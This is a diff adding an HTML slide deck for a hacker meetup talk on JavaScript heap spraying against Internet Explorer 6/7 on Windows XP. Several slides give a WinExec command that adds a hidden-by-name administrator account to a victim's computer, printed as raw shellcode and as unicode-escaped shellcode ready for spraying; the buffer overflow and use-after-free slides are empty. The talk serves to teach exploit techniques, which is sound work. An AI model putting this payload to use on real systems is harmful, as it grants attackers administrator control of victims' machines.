@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>reveal.js – The HTML Presentation Framework</title>
+
+		<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
+		<meta name="author" content="Hakim El Hattab">
+
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/black.css" id="theme">
+		<link rel="stylesheet" href="css/june_htell.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+				<section>
+					<h1>Heap Spray with Javascript</h1>
+					<h3> DC Hack and Tell (Round 33, Tue Jun 7 2016)</h3>
+					<p>
+						<small>Created by <a href="http://hakim.se">Dan Fujita</a> / <a>@danfujita</a></small>
+					</p>
+				</section>
+				<section>
+					<h2>Heap Spray </h2>
+					<ul>
+						<li>Can Avoid Address Space Layout Randomization</li>
+						<li>Used with Buffer Overflow or Use After Free</li>
+						<li>Cannot avoid Data Execution Prevention (JIT spray can)</li>
+					</ul>
+				</section>
+				
+				<section>
+					<h2>My environment </h2>
+					<ul>
+						<li>Windows XP 32 bit </li>
+						<li>Internet Explorer 6 and 7  </li>
+						<li>WinDbg Debugger </li>
+						<li>NotePad++  </li>
+						<li>Cygwin(GCC,G++,NASM)</li>
+					</ul>
+				</section>
+             	<section>
+					<h2>WinExec: Example</h2>
+					<ul>
+						<li>Add a Windows admin “daniel” to the victim’s computer. </li>
+						<li>WinExec("'cmd.exe /c net user Daniel 12345/ADD && net localgroup Administrators /ADD daniel'", SW_SHOW);</li>
+				
+					</ul>
+				</section>
+			
+								<section>
+					<h2>Shellcode</h2>
+					Before
+					<pre><code class="hljs" data-trim contenteditable>
+					
+\x31\xc0\x50\x68\x6e\x69\x65\x6c\x68\x44\x20\x44\x61\x68\
+x20\x2f\x41\x44\x68 \x74\x6f\x72\x73\x68\x73\x74\x72\x61\
+x68\x6d\x69\x6e\x69\x68\x70\x20\x41\x64\x68\x67\x72\x6f\x75
+\x68\x6f\x63\x61\x6c\x68\x65\x74\x20\x6c\x68\x26\x26\x20\
+x6e\x68\x44\x44\x20\x20\x68\x35\x20\x2f\x41\x68\x31\x32\x33
+\x34\x68\x69\x65\x6c\x20\x68\x20\x44\x61\x6e\x68\x75\x73\x65
+\x72\x68\x6e\x65\x74\x20\x68\x2f\x63\x20\x20\x68\x65\x78\x65
+\x20\x68\x63\x6d\x64\x2e\x89\xe0\x50\xbb\x5d\x2b\x86\x7c\xff\xd3
+                   					</code></pre>
+ After  					<pre><code class="hljs" data-trim contenteditable>
+
+%uc031%u6850%u696e%u6c65%u446 8%u4420%u6861%u2f20%u4441%u746 
+8%u726f%u6873%u7473%u6172%u6d6 8%u6e69%u6869%u2070%u6441%u67 
+68%u6f72%u6875%u636f%u6c61%u65 68%u2074%u686c%u2626%u6e20%u4 
+468%u2044%u6820%u2035%u412f%u3 168%u3332%u6834%u6569%u206c%u 
+2068%u6144%u686e%u7375%u7265% u6e68%u7465%u6820%u632f%u2020% 
+u6568%u6578%u6820%u6d63%u2e64 %ue089%ubb50%u2b5d%u7c86%ud3ff
+                   					</code></pre>
+
+					<p>Code syntax highlighting courtesy of <a href="http://softwaremaniacs.org/soft/highlight/en/description/">highlight.js</a>.</p>
+				</section>
+    <section >
+    	<h2>Sprayed Heap </h2>
+        <img src="heap.png" class="heap">
+    </section>
+ <section >
+    	<h2>Sprayed heap with nop slide </h2>
+        <img src="nopslide.png" class="heap">
+    </section>
+     	<section>
+					<h2>Buffer Overflow</h2>
+					<ul>
+				
+					</ul>
+				</section>
+
+				<section>
+					<h2>Use-After-Free</h2>
+					<ol>
+					</ol>
+				</section>
+				<section>
+					<h2>Todo</h2>
+					<ul>
+						<li>Consider using JIT Spray to avoid Data Execution Prevention  </li>
+						<li>Heap Spray or JIT Spray for Windows 10 </li>
+					</ul>
+				</section>
+                  <section>
+					<h2>References</h2>
+					<ul>
+						<li>Shellcoding for Linux and Windows Tutorial http://www.vividmachines.com/shellcode/shellcode.html  </li>
+						<li>Exploit writing tutorial part 11 : Heap Spraying Demystified https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/  </li>
+						<li> Part 9: Spraying the Heap [Chapter 2: Use-After-Free] – Finding a needle in a Haystack		http://www.fuzzysecurity.com/tutorials/expDev/11.html  </li>
+
+					</ul>
+				</section>
+				<section>
+
+					<h1>THE END</h1>
+					<p>
+					</p>
+				</section>
+
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+
+			// More info https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// More info https://github.com/hakimel/reveal.js#dependencies
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
